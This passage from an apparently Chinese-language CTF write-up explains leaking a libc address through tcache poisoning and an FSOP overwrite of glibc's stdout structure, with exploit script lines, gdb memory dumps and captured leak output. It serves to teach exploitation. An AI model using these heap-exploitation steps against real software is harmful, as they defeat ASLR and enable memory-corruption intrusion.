0x7ffff7fc4010 &lt;main_arena+976&gt;, 0x7ffff7fc4020 &lt;main_arena+992&gt;, 0x7ffff7fc4020 &lt;main_arena+992&gt;, 0x7ffff7fc4030 &lt;main_arena+1008&gt;, 0x7ffff7fc4030 &lt;main_arena+1008&gt;, 0x7ffff7fc4040 &lt;main_arena+1024&gt;, 0x7ffff7fc4040 &lt;main_arena+1024&gt;, 0x7ffff7fc4050 &lt;main_arena+1040&gt;, 0x7ffff7fc4050 &lt;main_arena+1040&gt;, 0x7ffff7fc4060 &lt;main_arena+1056&gt;, 0x7ffff7fc4060 &lt;main_arena+1056&gt;, 0x7ffff7fc4070 &lt;main_arena+1072&gt;, 0x7ffff7fc4070 &lt;main_arena+1072&gt;, 0x7ffff7fc4080 &lt;main_arena+1088&gt;, 0x7ffff7fc4080 &lt;main_arena+1088&gt;, 0x7ffff7fc4090 &lt;main_arena+1104&gt;, 0x7ffff7fc4090 &lt;main_arena+1104&gt;, 0x7ffff7fc40a0 &lt;main_arena+1120&gt;, 0x7ffff7fc40a0 &lt;main_arena+1120&gt;, 0x7ffff7fc40b0 &lt;main_arena+1136&gt;, 0x7ffff7fc40b0 &lt;main_arena+1136&gt;, 0x7ffff7fc40c0 &lt;main_arena+1152&gt;, 0x7ffff7fc40c0 &lt;main_arena+1152&gt;, 0x7ffff7fc40d0 &lt;main_arena+1168&gt;, 0x7ffff7fc40d0 &lt;main_arena+1168&gt;, 0x7ffff7fc40e0 &lt;main_arena+1184&gt;, 0x7ffff7fc40e0 &lt;main_arena+1184&gt;, 0x7ffff7fc40f0 &lt;main_arena+1200&gt;, 0x7ffff7fc40f0 &lt;main_arena+1200&gt;, 0x7ffff7fc4100 &lt;main_arena+1216&gt;, 0x7ffff7fc4100 &lt;main_arena+1216&gt;, 0x7ffff7fc4110 &lt;main_arena+1232&gt;, 0x7ffff7fc4110 &lt;main_arena+1232&gt;, 0x7ffff7fc4120 &lt;main_arena+1248&gt;, 0x7ffff7fc4120 &lt;main_arena+1248&gt;, 0x7ffff7fc4130 &lt;main_arena+1264&gt;, 0x7ffff7fc4130 &lt;main_arena+1264&gt;, 0x7ffff7fc4140 &lt;main_arena+1280&gt;, 0x7ffff7fc4140 &lt;main_arena+1280&gt;, 0x7ffff7fc4150 &lt;main_arena+1296&gt;, 0x7ffff7fc4150 &lt;main_arena+1296&gt;, 0x7ffff7fc4160 &lt;main_arena+1312&gt;, 0x7ffff7fc4160 &lt;main_arena+1312&gt;, 0x7ffff7fc4170 &lt;main_arena+1328&gt;, 0x7ffff7fc4170 &lt;main_arena+1328&gt;, 0x7ffff7fc4180 &lt;main_arena+1344&gt;, 0x7ffff7fc4180 &lt;main_arena+1344&gt;, 0x7ffff7fc4190 &lt;main_arena+1360&gt;, 0x7ffff7fc4190 &lt;main_arena+1360&gt;, 0x7ffff7fc41a0 &lt;main_arena+1376&gt;, 0x7ffff7fc41a0 &lt;main_arena+1376&gt;, 0x7ffff7fc41b0 &lt;main_arena+1392&gt;, 0x7ffff7fc41b0 &lt;main_arena+1392&gt;, 0x7ffff7fc41c0 &lt;main_arena+1408&gt;, 0x7ffff7fc41c0 &lt;main_arena+1408&gt;, 0x7ffff7fc41d0 &lt;main_arena+1424&gt;, 0x7ffff7fc41d0 &lt;main_arena+1424&gt;, 0x7ffff7fc41e0 &lt;main_arena+1440&gt;, 0x7ffff7fc41e0 &lt;main_arena+1440&gt;, 0x7ffff7fc41f0 &lt;main_arena+1456&gt;, 0x7ffff7fc41f0 &lt;main_arena+1456&gt;, 0x7ffff7fc4200 &lt;main_arena+1472&gt;, 0x7ffff7fc4200 &lt;main_arena+1472&gt;, 0x7ffff7fc4210 &lt;main_arena+1488&gt;, 0x7ffff7fc4210 &lt;main_arena+1488&gt;, 0x7ffff7fc4220 &lt;main_arena+1504&gt;, 0x7ffff7fc4220 &lt;main_arena+1504&gt;, 0x7ffff7fc4230 &lt;main_arena+1520&gt;, 0x7ffff7fc4230 &lt;main_arena+1520&gt;, 0x7ffff7fc4240 &lt;main_arena+1536&gt;, 0x7ffff7fc4240 &lt;main_arena+1536&gt;, 0x7ffff7fc4250 &lt;main_arena+1552&gt;, 0x7ffff7fc4250 &lt;main_arena+1552&gt;, 0x7ffff7fc4260 &lt;main_arena+1568&gt;, 0x7ffff7fc4260 &lt;main_arena+1568&gt;, 0x7ffff7fc4270 &lt;main_arena+1584&gt;, 0x7ffff7fc4270 &lt;main_arena+1584&gt;, 0x7ffff7fc4280 &lt;main_arena+1600&gt;, 0x7ffff7fc4280 &lt;main_arena+1600&gt;, 0x7ffff7fc4290 &lt;main_arena+1616&gt;, 0x7ffff7fc4290 &lt;main_arena+1616&gt;, 0x7ffff7fc42a0 &lt;main_arena+1632&gt;, 0x7ffff7fc42a0 &lt;main_arena+1632&gt;, 0x7ffff7fc42b0 &lt;main_arena+1648&gt;, 0x7ffff7fc42b0 &lt;main_arena+1648&gt;, 0x7ffff7fc42c0 &lt;main_arena+1664&gt;, 0x7ffff7fc42c0 &lt;main_arena+1664&gt;, 0x7ffff7fc42d0 &lt;main_arena+1680&gt;, 0x7ffff7fc42d0 &lt;main_arena+1680&gt;...&#125;, binmap = &#123;0, 0, 0, 0&#125;, next = 0x7ffff7fc3c40 &lt;main_arena&gt;, next_free = 0x0, attached_threads = 1, system_mem = 135168, max_system_mem = 135168&#125;</span><br></pre></td></tr></table></figure>

<h2 id="泄露Libc"><a href="#泄露Libc" class="headerlink" title="泄露Libc"></a>泄露Libc</h2><ul>
<li>FSOP泄露</li>
</ul>
<p>使用一种名为面向文件系统编程(FSOP)的技术来泄漏libc地址。FSOP的思想是攻击文件流对象的GLIBC实现。这篇<span class="exturl" data-url="aHR0cHM6Ly9nc2VjLmhpdGIub3JnL21hdGVyaWFscy9zZzIwMTgvV0hJVEVQQVBFUlMvRklMRSUyMFN0cnVjdHVyZXMlMjAtJTIwQW5vdGhlciUyMEJpbmFyeSUyMEV4cGxvaXRhdGlvbiUyMFRlY2huaXF1ZSUyMC0lMjBBbi1KaWUlMjBZYW5nLnBkZg==">2018年的论文<i class="fa fa-external-link-alt"></i></span>详细介绍了文件流和文件对象结构。如果程序自己创建了一个用fopen打开的文件，就能找到那个结构并打乱它。文件对象中还有函数指针，可以覆盖它们以执行代码。但还不能这样做，因为还不知道应该写什么地址。</p>
<p>所能做的是找到并覆盖_flag和_IO_write_base指针，以便在写入该文件流的下一个操作中写入其他内容。</p>
<p>当然，所有这些都假设有一个FILE对象。stdin和stdout是保存在LIBC空间中的文件对象。因为使用的libc带有debug符号，可以通过名称打印stdout，并使用&amp;获得地址:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(gdb) p _IO_2_1_stdout_</span><br><span class="line"><span class="variable">$3</span> = &#123;file = &#123;_flags = -72537977, _IO_read_ptr = 0x7ffff7fc47e3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>, _IO_read_end = 0x7ffff7fc47e3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>, _IO_read_base = 0x7ffff7fc47e3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>, _IO_write_base = 0x7ffff7fc47e3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>, _IO_write_ptr = 0x7ffff7fc47e3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>, _IO_write_end = 0x7ffff7fc47e3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>, _IO_buf_base = 0x7ffff7fc47e3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>, _IO_buf_end = 0x7ffff7fc47e4 &lt;_IO_2_1_stdout_+132&gt; <span class="string">&quot;&quot;</span>, _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0x7ffff7fc3a00 &lt;_IO_2_1_stdin_&gt;, _fileno = 1, _flags2 = 0, _old_offset = -1, _cur_column = 0, _vtable_offset = 0 <span class="string">&#x27;\000&#x27;</span>, _shortbuf = <span class="string">&quot;\n&quot;</span>, _lock = 0x7ffff7fc6580 &lt;_IO_stdfile_1_lock&gt;, _offset = -1, _codecvt = 0x0, _wide_data = 0x7ffff7fc38c0 &lt;_IO_wide_data_1&gt;, _freeres_list = 0x0, _freeres_buf = 0x0, __pad5 = 0, _mode = -1, _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats 19 <span class="built_in">times</span>&gt;&#125;, vtable = 0x7ffff7fc5560 &lt;__GI__IO_file_jumps&gt;&#125;</span><br><span class="line"></span><br><span class="line">(gdb) p &amp;_IO_2_1_stdout_</span><br><span class="line"><span class="variable">$2</span> = (struct _IO_FILE_plus *) 0x7ffff7fc4760 &lt;_IO_2_1_stdout_&gt;</span><br></pre></td></tr></table></figure>

<p>因此，如果可以将_IO_write_base更改为_IO_write_end之前的某个值，将诱使stdout认为内容已被缓存并等待发送。当前指针是0x7ffff7fc47e3。如果只写一个空字节，那么它将是0x7ffff7fc4700:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/12xg 0x00007ffff7fc4700</span><br><span class="line">0x7ffff7fc4700 &lt;_IO_2_1_stderr_+128&gt;:   0x0000000000000000      0x00007ffff7fc6570</span><br><span class="line">0x7ffff7fc4710 &lt;_IO_2_1_stderr_+144&gt;:   0xffffffffffffffff      0x0000000000000000</span><br><span class="line">0x7ffff7fc4720 &lt;_IO_2_1_stderr_+160&gt;:   0x00007ffff7fc3780      0x0000000000000000</span><br><span class="line">0x7ffff7fc4730 &lt;_IO_2_1_stderr_+176&gt;:   0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7fc4740 &lt;_IO_2_1_stderr_+192&gt;:   0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7fc4750 &lt;_IO_2_1_stderr_+208&gt;:   0x0000000000000000      0x00007ffff7fc5560</span><br></pre></td></tr></table></figure>

<p>如果打印过来，就会泄露libc绕过ASLR。</p>
<ul>
<li>改变指向_IO_2_1_stdout的指针</li>
</ul>
<p>当最后结束时，已经将main_arena中的这个指针写到堆中，并设法释放了两个“文件”。也可以访问一个重叠块之前的main_arena指针:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0x55555555c3a0: 0x0000000000000000      0x0000000000000081  &lt;-- chunk B, currently <span class="keyword">in</span> tcache</span><br><span class="line">0x55555555c3b0: 0x0000000000000000      0x000055555555c010</span><br><span class="line">0x55555555c3c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c3d0: 0x0000000000000000      0x00000000000000a1</span><br><span class="line">0x55555555c3e0: 0x00007ffff7fc3ca0      0x00007ffff7fc3ca0  &lt;-- libc meta</span><br><span class="line">0x55555555c3f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c400: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c410: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c420: 0x0000000000000000      0x0000000000000031</span><br></pre></td></tr></table></figure>

<p>想写0x7ffff7fc4760。将获取B，并使用它修改libc地址的低两个字节，指向_IO_2_1_stdout_:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">&#x27;B&#x27;</span>, 0x70)</span><br><span class="line">edit(<span class="string">&#x27;B&#x27;</span>, 0x70, p64(0)*5 + p64(0xa1) + b<span class="string">&quot;\x60\x47&quot;</span>)</span><br><span class="line"><span class="built_in">rm</span>(<span class="string">&#x27;B&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>现在在堆上有了想要写入的地址:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x55555555c3a0: 0x0000000000000000      0x0000000000000081</span><br><span class="line">0x55555555c3b0: 0x0000000000000000      0x000055555555c010</span><br><span class="line">0x55555555c3c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c3d0: 0x0000000000000000      0x00000000000000a1</span><br><span class="line">0x55555555c3e0: 0x00007ffff7fc4760      0x00007ffff7fc3ca0  &lt;-- now points to stdout</span><br></pre></td></tr></table></figure>

<p>当发现启用了ASLR时，这可能会失败。这是因为地址的低三个字节(0x760)是一致的，高一点的字节(在本例中是4)将改变ASLR。一旦它正常工作，就会打开ASLR，这样它答对的概率就会是1&#x2F;16, 6.25% 尽管如此，仍然可以反复进行攻击，所以在10次尝试中，有50%的几率成功，在20次尝试中，我有75%的几率成功。将更新脚本以循环失败。</p>
<ul>
<li>定位写到_IO_2_1_stdout</li>
</ul>
<p>现在，想在这个结构上创建一个块，将使用与以前相同的tcache毒化技术。经过一堆重写，设法达到这一点的tcache看起来像:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(0x20)   tcache_entry[0](1): 0x55555555c2e0                                                                               </span><br><span class="line">(0x30)   tcache_entry[1](3): 0x55555555c430 --&gt; 0x55555555c430 (overlap chunk with 0x55555555c420(freed) )                </span><br><span class="line">(0x40)   tcache_entry[2](2): 0x55555555c460 --&gt; 0x55555555c300</span><br><span class="line">(0x50)   tcache_entry[3](1): 0x55555555c2b0 (overlap chunk with 0x55555555c2d0(freed) )</span><br><span class="line">(0x60)   tcache_entry[4](1): 0x55555555c290 (overlap chunk with 0x55555555c2d0(freed) )</span><br><span class="line">(0x80)   tcache_entry[6](1): 0x55555555c3b0</span><br><span class="line">(0xa0)   tcache_entry[8](7): 0x55555555c3e0 (overlap chunk with 0x55555555c420(freed) )</span><br></pre></td></tr></table></figure>

<p>如果目标地址在0x300s中，那么0x40 tcache bins看起来是一个很好的目标。将使用与上面相同的技巧编辑指针，在460处获取bin，将其编辑为0，使第二个文件指向它，释放第一个文件，以便在有一个句柄的时候它回到tcache中，然后编辑地址。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">&#x27;F&#x27;</span>, 0x30)           <span class="comment"># fetch 460 chunk from tcache, 300 still in 0x40 tcache</span></span><br><span class="line">edit(<span class="string">&#x27;F&#x27;</span>, 0)             <span class="comment"># 460 -&gt; 300 in 0x40 tcache, f1 -&gt; 460 </span></span><br><span class="line">add(<span class="string">&#x27;F2&#x27;</span>, 0x30)          <span class="comment"># f1 and f2 -&gt; 460, 300 in 0x40 tcache</span></span><br><span class="line"><span class="built_in">rm</span>(<span class="string">&#x27;F&#x27;</span>)                  <span class="comment"># f2 -&gt; 460, 460 -&gt; 300 in 0x40 tcache</span></span><br><span class="line">edit(<span class="string">&#x27;F2&#x27;</span>, 0x30, <span class="string">&#x27;\xe0&#x27;</span>) <span class="comment"># 460 -&gt; 3e0 -&gt; stdout in 0x40 tcache</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get 460 from tcahce, shrink it, and release it</span></span><br><span class="line">add(<span class="string">&#x27;F3&#x27;</span>, 0x30)</span><br><span class="line">edit(<span class="string">&#x27;F3&#x27;</span>, 0x10)</span><br><span class="line"><span class="built_in">rm</span>(<span class="string">&#x27;F3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># get 3e0 from tcache, shrink it, and release it</span></span><br><span class="line">add(<span class="string">&#x27;fake3&#x27;</span>, 0x30)</span><br><span class="line">edit(<span class="string">&#x27;fake3&#x27;</span>, 0x10)</span><br><span class="line"><span class="built_in">rm</span>(<span class="string">&#x27;fake3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># clean up F2</span></span><br><span class="line">edit(<span class="string">&#x27;F2&#x27;</span>, 0x10, p64(0)*2) <span class="comment"># overwrtie pointer and key to allow double free</span></span><br><span class="line"><span class="built_in">rm</span>(<span class="string">&#x27;F2&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>此时，0x40 tcache列表指向_IO_2_1_stdout_:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(0x40)   tcache_entry[2](0): 0x7ffff7fc4760 --&gt; 0xfbad2887 (invalid memory)</span><br></pre></td></tr></table></figure>

<ul>
<li>写_IO_2_1_stdout</li>
</ul>
<p>如上所述，将攻击stdout的文件结构。在gdb中展示了上面的结构体，但<span class="exturl" data-url="aHR0cDovL3NvdXJjZXdhcmUub3JnL2dpdC8/cD1nbGliYy5naXQ7YT1ibG9iO2Y9bGliaW8vbGliaW8uaDtoPTNjZjE3MTJlYTk4ZDNjMjUzZjQxOGZlYjFlZjg4MWM0YTQ0NjQ5ZDU7aGI9SEVBRCNsMjQ1">源代码<i class="fa fa-external-link-alt"></i></span>也很有用:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"> 245 struct _IO_FILE &#123;</span><br><span class="line"> 246   int _flags;           /* High-order word is _IO_MAGIC; rest is flags. */</span><br><span class="line"> 247 <span class="comment">#define _IO_file_flags _flags</span></span><br><span class="line"> 248 </span><br><span class="line"> 249   /* The following pointers correspond to the C++ streambuf protocol. */</span><br><span class="line"> 250   /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span><br><span class="line"> 251   char* _IO_read_ptr;   /* Current <span class="built_in">read</span> pointer */</span><br><span class="line"> 252   char* _IO_read_end;   /* End of get area. */</span><br><span class="line"> 253   char* _IO_read_base;  /* Start of putback+get area. */</span><br><span class="line"> 254   char* _IO_write_base; /* Start of put area. */</span><br><span class="line"> 255   char* _IO_write_ptr;  /* Current put pointer. */</span><br><span class="line"> 256   char* _IO_write_end;  /* End of put area. */</span><br><span class="line"> 257   char* _IO_buf_base;   /* Start of reserve area. */</span><br><span class="line"> 258   char* _IO_buf_end;    /* End of reserve area. */</span><br><span class="line"> 259   /* The following fields are used to support backing up and undo. */</span><br><span class="line"> 260   char *_IO_save_base; /* Pointer to start of non-current get area. */</span><br><span class="line"> 261   char *_IO_backup_base;  /* Pointer to first valid character of backup area */</span><br><span class="line"> 262   char *_IO_save_end; /* Pointer to end of non-current get area. */</span><br><span class="line">...[snip]...</span><br><span class="line"> 285 <span class="comment">#ifdef _IO_USE_OLD_IO_FILE</span></span><br><span class="line"> 286 &#125;;</span><br></pre></td></tr></table></figure>

<p>将覆盖_flags、三个_IO_read_*地址和_IO_write_ptr的低字节。_flags在<span class="exturl" data-url="aHR0cDovL3NvdXJjZXdhcmUub3JnL2dpdC8/cD1nbGliYy5naXQ7YT1ibG9iO2Y9bGliaW8vbGliaW8uaDtoPTNjZjE3MTJlYTk4ZDNjMjUzZjQxOGZlYjFlZjg4MWM0YTQ0NjQ5ZDU7aGI9SEVBRCNsODY=">这里<i class="fa fa-external-link-alt"></i></span>定义:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> 92 <span class="comment">#define _IO_MAGIC 0xFBAD0000 /* Magic number */</span></span><br><span class="line"> 93 <span class="comment">#define _OLD_STDIO_MAGIC 0xFABC0000 /* Emulate old stdio. */</span></span><br><span class="line"> 94 <span class="comment">#define _IO_MAGIC_MASK 0xFFFF0000</span></span><br><span class="line"> 95 <span class="comment">#define _IO_USER_BUF 1 /* User owns buffer; don&#x27;t delete it on close. */</span></span><br><span class="line"> 96 <span class="comment">#define _IO_UNBUFFERED 2</span></span><br><span class="line"> 97 <span class="comment">#define _IO_NO_READS 4 /* Reading not allowed */</span></span><br><span class="line"> 98 <span class="comment">#define _IO_NO_WRITES 8 /* Writing not allowed */</span></span><br><span class="line"> 99 <span class="comment">#define _IO_EOF_SEEN 0x10</span></span><br><span class="line">100 <span class="comment">#define _IO_ERR_SEEN 0x20</span></span><br><span class="line">101 <span class="comment">#define _IO_DELETE_DONT_CLOSE 0x40 /* Don&#x27;t call close(_fileno) on cleanup. */</span></span><br><span class="line">102 <span class="comment">#define _IO_LINKED 0x80 /* Set if linked (using _chain) to streambuf::_list_all.*/</span></span><br><span class="line">103 <span class="comment">#define _IO_IN_BACKUP 0x100</span></span><br><span class="line">104 <span class="comment">#define _IO_LINE_BUF 0x200</span></span><br><span class="line">105 <span class="comment">#define _IO_TIED_PUT_GET 0x400 /* Set if put and get pointer logicly tied. */</span></span><br><span class="line">106 <span class="comment">#define _IO_CURRENTLY_PUTTING 0x800</span></span><br><span class="line">107 <span class="comment">#define _IO_IS_APPENDING 0x1000</span></span><br><span class="line">108 <span class="comment">#define _IO_IS_FILEBUF 0x2000</span></span><br><span class="line">109 <span class="comment">#define _IO_BAD_SEEN 0x4000</span></span><br><span class="line">110 <span class="comment">#define _IO_USER_LOCK 0x8000</span></span><br></pre></td></tr></table></figure>

<p>两个高字节将是0xfbad，这是该结构的神奇数字。对于底部的两个字节，将打开_io_currently_puts和_IO_IS_APPENDING。这些标记是在其他CTF文章中看到过的，在这里表明这些数据已经准备好了。</p>
<p>不认为在三个_IO_read_*字段中写什么是非常重要的，因为没有东西从stdout读取。然后，想要一个在_IO_write_ptr空字节的低字节。</p>
<p>将得到一个机会写到_IO_2_1_stdout_，因为调用edit将调用realloc，这将失败，因为它将发现意外的数据，它期待堆元。仔细观察add，它使用fgets，所以它将<span class="exturl" data-url="aHR0cDovL3d3dy5jcGx1c3BsdXMuY29tL3JlZmVyZW5jZS9jc3RkaW8vZmdldHMv">读取到完整的大小，或者直到换行<i class="fa fa-external-link-alt"></i></span>。因为不会写完整的大小，所以sendline的换行符会在那里。它还在输入的末尾追加一个null。</p>
<p>把所有这些放在一起，将创建如下的bin:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">&#x27;stdout&#x27;</span>, 0x30, p64(0xfbad1800) + p64(0)*2 + b<span class="string">&quot;\x00&quot;</span>*7)</span><br></pre></td></tr></table></figure>

<ul>
<li>泄露</li>
</ul>
<p>为了看到实际操作，将运行对_IO_2_1_stdout_的写入操作，然后附加gdb并在0x0000555555555b92处设置一个额外的断点。这是在添加完成之后，但在打印任何内容之前(一旦打印完成，文件中的所有指针都将被更新)。现在，将跳过Python脚本中的泄漏指令，gdb将达到这个断点。将检查_IO_2_1_stdout_:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Breakpoint 2, 0x0000555555555b92 <span class="keyword">in</span> ?? ()</span><br><span class="line">(gdb) x/12xg &amp;_IO_2_1_stdout_</span><br><span class="line">0x7ffff7fc4760 &lt;_IO_2_1_stdout_&gt;:       0x00000000fbad1800      0x0000000000000000  &lt;-- modified flags, null <span class="built_in">read</span> ptr</span><br><span class="line">0x7ffff7fc4770 &lt;_IO_2_1_stdout_+16&gt;:    0x0000000000000000      0x0a00000000000000  &lt;-- null <span class="built_in">read</span> end, null <span class="built_in">read</span> base</span><br><span class="line">0x7ffff7fc4780 &lt;_IO_2_1_stdout_+32&gt;:    0x00007ffff7fc4700      0x00007ffff7fc47e3  &lt;-- low byte 0 <span class="keyword">for</span> write ptr</span><br><span class="line">0x7ffff7fc4790 &lt;_IO_2_1_stdout_+48&gt;:    0x00007ffff7fc47e3      0x00007ffff7fc47e3</span><br><span class="line">0x7ffff7fc47a0 &lt;_IO_2_1_stdout_+64&gt;:    0x00007ffff7fc47e4      0x0000000000000000</span><br><span class="line">0x7ffff7fc47b0 &lt;_IO_2_1_stdout_+80&gt;:    0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>当允许继续这样做(并且通过在调用的末尾添加日志级别为DEBUG的Python脚本运行)，可以看到数据返回:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Sent 0xb bytes:</span><br><span class="line">    b<span class="string">&#x27;add stdout\n&#x27;</span></span><br><span class="line">[DEBUG] Received 0x6 bytes:</span><br><span class="line">    b<span class="string">&#x27;size: &#x27;</span></span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    b<span class="string">&#x27;48\n&#x27;</span></span><br><span class="line">[DEBUG] Received 0x9 bytes:</span><br><span class="line">    b<span class="string">&#x27;content: &#x27;</span></span><br><span class="line">[DEBUG] Sent 0x20 bytes:</span><br><span class="line">    00000000  00 18 ad fb  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│</span><br><span class="line">    00000010  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 0a  │····│····│····│····│</span><br><span class="line">    00000020</span><br><span class="line">[DEBUG] Received 0xe5 bytes:</span><br><span class="line">    00000000  00 00 00 00  00 00 00 00  70 65 <span class="built_in">fc</span> f7  ff 7f 00 00  │····│····│pe··│····│</span><br><span class="line">    00000010  ff ff ff ff  ff ff ff ff  00 00 00 00  00 00 00 00  │····│····│····│····│</span><br><span class="line">    00000020  80 37 <span class="built_in">fc</span> f7  ff 7f 00 00  00 00 00 00  00 00 00 00  │·7··│····│····│····│</span><br><span class="line">    00000030  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│</span><br><span class="line">    *</span><br><span class="line">    00000050  00 00 00 00  00 00 00 00  60 55 <span class="built_in">fc</span> f7  ff 7f 00 00  │····│····│`U··│····│</span><br><span class="line">    00000060  00 18 ad fb  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│</span><br><span class="line">    00000070  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 0a  │····│····│····│····│</span><br><span class="line">    00000080  00 47 <span class="built_in">fc</span> f7  ff 7f 00 00  e3 47 <span class="built_in">fc</span> f7  ff 7f 00 00  │·G··│····│·G··│····│</span><br><span class="line">    00000090  e3 47 <span class="built_in">fc</span> f7  ff 7f 00 00  e3 47 <span class="built_in">fc</span> f7  ff 7f 00 00  │·G··│····│·G··│····│</span><br><span class="line">    000000a0  e4 47 <span class="built_in">fc</span> f7  ff 7f 00 00  00 00 00 00  00 00 00 00  │·G··│····│····│····│</span><br><span class="line">    000000b0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│</span><br><span class="line">    000000c0  00 00 00 00  00 00 00 00  00 3a <span class="built_in">fc</span> f7  ff 7f 00 00  │····│····│·:··│····│</span><br><span class="line">    000000d0  01 00 00 00  00 00 00 00  ff ff ff ff  ff ff ff ff  │····│····│····│····│</span><br><span class="line">    000000e0  00 00 00 24  20                                     │···$│ │</span><br><span class="line">    000000e5</span><br></pre></td></tr></table></figure>

<p>跟之前看到的和预期的相符。可以从8-15字节中提取libc地址。</p>
<p>当第一次解决这个问题时，没有添加返回任何东西，但更新它返回任何返回的东西，所以可以捕捉它，并从它获得libc地址。</p>
